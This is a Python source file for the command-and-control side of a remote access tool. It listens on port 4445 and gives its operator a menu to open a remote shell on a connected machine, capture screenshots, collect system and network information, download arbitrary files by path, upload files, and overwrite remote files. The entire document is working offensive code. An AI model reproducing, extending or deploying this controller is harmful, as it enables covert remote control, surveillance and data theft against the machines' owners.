import socket
import os
import subprocess
import random
import string
import time
myboi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

myboi.bind(("0.0.0.0", 4445))

myboi.listen(10)


def send_file(filename,child=""):
    if not child == "":
        clt.send(f"Sending {child}".encode())
        time.sleep(0.5)
        item = open(filename+child, "rb")
        data = item.read(1024)
        while data:
            clt.send(data)
            data = item.read(1024)
        item.close()
    else:
        clt.send(f"Sending {filename}".encode())
        time.sleep(0.5)
        if file_name.endswith(".png") or file_name.endswith(".jpg") or file_name.endswith(".jpeg"):
            item = open(filename, "rb")
            data = item.read(1024)
            while data:
                clt.send(data)
                data = item.read(1024)
            item.close()
        else:
            item = open(filename, "r")
            data = item.read(1024)
            while data:
                clt.send(data.encode())
                data = item.read(1024)
            item.close()
    



def receive_file():
    clt.send(f"get {file_name}".encode())
    file_exists = clt.recv(1024).decode()
    if file_exists == "True":
        output = receive_data()
        for x in output:
            edit.write(x + "\n")
        edit.close()
        return True
    elif file_exists == "False":
        return False


def receive_data():
    while True:
        output = []
        message = clt.recv(1024)
        if len(message) < 1024:
            output += "".join(map(chr, message)).split("\n")
            return output
        output += "".join(map(chr, message)).split("\n")
    return output



clt, address = myboi.accept()
print(f"{address} is connected!")
while True:
    try:
        start = int(input("1)Drop into a shell\n2)Screenshot\n3)Get computer info\n4)Get ip address of device\n5)Edit/create a file\n6)Get a file\n7)Send a file\n8)Exit\n>>> "))
        if start == 1:
            while True:
                plan = input("Insert command to execute, or 'exit' to exit\n>>> ")
                if plan.casefold() == "exit":
                    break
                clt.send(plan.encode())
                while True:
                    output = []
                    message = clt.recv(1024)
                    hello = len(message)
                    if len(message) < 1024:
                        output += "".join(map(chr, message)).split("\n")
                        break
                    output += "".join(map(chr, message)).split("\n")
                for x in output:
                    print(x)
        elif start == 2:
            clt.send("screenshot".encode())
            file_name  = ""
            for x in range(20):
                file_name += random.choice(string.ascii_letters+string.digits)
            file_name += ".png"
            picture = open(file_name,"xb")
            message = clt.recv(1024)
            while True:
                if message == "Done!".encode():
                    break
                picture.write(message)
                message = clt.recv(1024)
            picture.close()
            print(f"Picture is saved at {file_name}")
        elif start == 3:
            clt.send("uname -a".encode())
        elif start == 4:
            clt.send("ifconfig".encode())
        elif start == 5:
            if start == 5:
                temp_file = ""
                for x in range(15):
                    temp_file += random.choice(string.ascii_letters +
                                            string.digits)
                edit = open(f"/tmp/{temp_file}.txt", "x")
                edit_or_create = int(input("1)Edit\n2)Create"))
                if edit_or_create == 1:
                    file_name = input("Input ABSOLUTE PATH of the file you want: ")
                    success = receive_file()
                    if success:
                        editor = subprocess.run(
                            f"vim /tmp/{temp_file}.txt", shell=True)
                        send_file(f"/tmp/{temp_file}.txt")
                        time.sleep(0.5)
                        clt.send(f"rm {file_name}".encode())
                        time.sleep(0.5)
                        clt.send(f"mv /tmp/{temp_file}.txt {file_name} ".encode())
                        os.remove(f"/tmp/{temp_file}.txt")
                        print("Success!\n")
                    else:
                        print(
                            "File doenst exist or you don't have permission to access the file!!")
                else:
                    print("File will be created at the /tmp directory to avoid errors....\n")
                    file_name = input("Input name of the file you want: ")
                    editor = subprocess.run(
                        f"vim /tmp/{file_name}",shell=True)
                    send_file(f"/tmp/{file_name}")
                    os.remove(f"/tmp/{file_name}")
                    print("Success!")
        elif start == 6:
            try:
                file_name = input("Input ABSOLUTE PATH of the file you want: ")
                filee_list = file_name.split("/")
                filee_list.reverse()
                hey = filee_list[0]
                edit = open(hey, "x")
                success = receive_file()
                if success:
                    print("Success!")
                else:
                    print("File doenst exist or you don't have permission to access the file!!")
            except FileExistsError as e:
                print(e)
                print("File exists!")
        elif start == 7:
            file_name = input("Input Absolute path of the file you want without the filename itself\nfor eg: if you want to send /tmp/hello.txt, just type /tmp/\n>>> ")
            child = input("Input file name: ")
            send_file(file_name,child)
        elif start == 8:
            clt.send("exit".encode())
            myboi.close()
            break
        if not (start == 1 or start == 2  or start == 5 or start == 6 or start == 7 or start == 8):
            output = receive_data()
            for x in output:
                print(x)

    except ValueError as e:
        print(e)
        print("Invalid input!")

print("Bye Bye!!")
